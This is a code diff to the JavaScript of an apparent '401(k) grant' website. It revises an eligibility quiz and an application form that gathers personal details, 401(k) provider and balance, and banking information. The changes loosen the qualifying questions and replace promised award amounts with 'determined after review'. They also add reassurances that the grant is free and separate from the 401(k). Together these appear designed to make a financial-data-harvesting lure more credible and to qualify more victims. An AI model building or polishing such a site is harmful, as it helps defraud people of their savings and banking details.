@@ -66,30 +66,25 @@ function initEligibilityChecker() {
 
   const questions = [
     {
-      q: 'Do you currently have an active 401(k) account?',
-      desc: 'This program is exclusively for individuals with an established 401(k) retirement account.',
-      options: ['Yes, I have an active 401(k) account', 'No, I do not have a 401(k) account']
+      q: 'Do you currently own a 401(k) account?',
+      desc: '401(k) ownership is required, but grant funds are separate and will not affect your account balance.',
+      options: ['Yes, I own a 401(k) account', 'No, I do not have a 401(k) account']
     },
     {
-      q: 'Is your 401(k) account valued at $20,000 or more?',
-      desc: 'Accounts must meet a minimum balance threshold to qualify for grant consideration.',
-      options: ['Yes, my balance is $20,000+', 'My balance is between $10,000–$20,000', 'My balance is below $10,000']
+      q: 'Are you currently working?',
+      desc: 'Applicants must currently be employed or self-employed in the United States.',
+      options: ['Yes, I am employed', 'Yes, I am self-employed', 'No, I am not currently working']
     },
     {
-      q: 'Do you own or plan to start a small business?',
-      desc: 'Grants are intended for business purposes including startup, expansion, or recovery.',
-      options: ['Yes, I currently own a business', 'Yes, I plan to start one within 90 days', 'No, not at this time']
+      q: 'Are you a U.S. citizen?',
+      desc: 'This grant is available to working citizens of the United States.',
+      options: ['Yes, I am a U.S. citizen', 'No, I am not a U.S. citizen']
     },
     {
-      q: 'Are you a U.S. citizen or legal resident?',
-      desc: 'This program requires applicants to be legally authorized to conduct business in the United States.',
-      options: ['Yes, U.S. Citizen', 'Yes, Legal Permanent Resident', 'No / Prefer not to say']
+      q: 'Are you at least 18 years old?',
+      desc: 'Applicants must be legal adults who can submit their own information for review.',
+      options: ['Yes, I am 18 or older', 'No, I am under 18']
     },
-    {
-      q: 'What is your current credit score range?',
-      desc: 'While perfect credit is not required, we review financial responsibility as part of the process.',
-      options: ['700 or higher (Excellent)', '650–699 (Good)', '600–649 (Fair)', 'Below 600 (Building)']
-    }
   ];
 
   let currentStep = 0;
@@ -167,26 +162,22 @@ function initEligibilityChecker() {
   function calculateEligibility() {
     let score = 0;
 
-    if (answers[0] === 0) score += 30;
+    if (answers[0] === 0) score += 25;
     else return { eligible: false, reason: 'This program is exclusive to 401(k) account holders.' };
 
-    if (answers[1] === 0) score += 25;
-    else if (answers[1] === 1) score += 15;
-    else return { eligible: false, reason: 'Your 401(k) balance is below our minimum threshold at this time.' };
+    if (answers[1] === 0 || answers[1] === 1) score += 25;
+    else return { eligible: false, reason: 'You must be currently employed or self-employed to qualify.' };
 
-    if (answers[2] === 0 || answers[2] === 1) score += 20;
-    else return { eligible: false, reason: 'Grants require a business purpose (existing or planned startup).' };
+    if (answers[2] === 0) score += 25;
+    else return { eligible: false, reason: 'This grant is available to U.S. citizens.' };
 
-    if (answers[3] === 0 || answers[3] === 1) score += 15;
-
-    if (answers[4] === 0) score += 10;
-    else if (answers[4] === 1) score += 8;
-    else if (answers[4] === 2) score += 5;
+    if (answers[3] === 0) score += 25;
+    else return { eligible: false, reason: 'Applicants must be at least 18 years old.' };
 
     return {
-      eligible: score >= 75,
+      eligible: score === 100,
       score: score,
-      range: score >= 90 ? '$35,000 – $40,000' : score >= 80 ? '$30,000 – $35,000' : '$25,000 – $30,000'
+      range: 'determined after your application is reviewed'
     };
   }
 
@@ -205,8 +196,8 @@ function initEligibilityChecker() {
             <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
           </svg>
         </div>
-        <h4>You Qualify!</h4>
-        <p>Congratulations! Based on your answers, you meet the eligibility requirements. Your estimated grant range is <strong>${result.range}</strong>.</p>
+        <h4>You Meet the Basic Requirements</h4>
+        <p>Based on your answers, you may submit an application for review. Approval is not guaranteed, and your award amount will be <strong>${result.range}</strong>. The grant is free of charge and separate from your 401(k).</p>
         <a href="application.html" class="btn btn-primary btn-lg glow">Start My Application</a>
       `;
     } else {
@@ -271,7 +262,7 @@ function initApplicationForm() {
     banking: {}
   };
 
-  const stepLabels = ['Personal', '401(k)', 'Business', 'Banking', 'Review'];
+  const stepLabels = ['Personal', '401(k)', 'Purpose', 'Banking', 'Review'];
 
   function updateProgressSteps() {
     const steps = document.querySelectorAll('.progress-step');
@@ -347,8 +338,8 @@ function initApplicationForm() {
       <div class="review-item"><span class="label">Street Address</span><span class="value">${p.address || '—'}</span></div>
       <div class="review-item"><span class="label">401(k) Provider</span><span class="value">${k.provider || '—'}</span></div>
       <div class="review-item"><span class="label">Account Balance</span><span class="value">${k.balance ? '$' + Number(k.balance).toLocaleString() : '—'}</span></div>
-      <div class="review-item"><span class="label">Business Name</span><span class="value">${b.businessName || '—'}</span></div>
-      <div class="review-item"><span class="label">Business Type</span><span class="value">${b.businessType || '—'}</span></div>
+      <div class="review-item"><span class="label">Business / Need</span><span class="value">${b.businessName || '—'}</span></div>
+      <div class="review-item"><span class="label">Employment Status</span><span class="value">${b.businessType || '—'}</span></div>
       <div class="review-item"><span class="label">Grant Amount</span><span class="value">${b.grantAmount ? '$' + Number(b.grantAmount).toLocaleString() : '—'}</span></div>
       <div class="review-item"><span class="label">Bank Name</span><span class="value">${ba.bankName || '—'}</span></div>
       <div class="review-item"><span class="label">Account Type</span><span class="value">${ba.accountType || '—'}</span></div>
